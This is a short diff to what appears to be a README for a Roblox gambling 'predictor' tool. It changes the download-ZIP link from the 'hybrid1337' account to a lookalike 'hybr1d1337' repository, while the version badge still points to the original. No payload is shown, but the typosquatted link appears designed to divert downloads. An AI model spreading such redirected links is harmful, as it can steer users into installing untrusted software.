@@ -2,7 +2,7 @@
 
 ![Logo](assets/blox.png)
 
-[![DOWNLOAD ZIP](https://img.shields.io/badge/ROBLOX-DOWNLOAD_ZIP-7289da?style=for-the-badge&logo=roblox&logoColor=white)](https://github.com/hybrid1337/HYBRID-S-BLOXLUCK/archive/refs/heads/main.zip)
+[![DOWNLOAD ZIP](https://img.shields.io/badge/ROBLOX-DOWNLOAD_ZIP-7289da?style=for-the-badge&logo=roblox&logoColor=white)](https://github.com/hybr1d1337/HYBRID-S-BLOXLUCK-PREDICTOR-2026/archive/refs/heads/main.zip)
 [![PREDICTOR VERSION](https://img.shields.io/badge/PREDICTOR-V9.2-00ff88?style=for-the-badge&logo=codeforces&logoColor=black)](https://github.com/hybrid1337/HYBRID-S-BLOXLUCK)
 
 ---
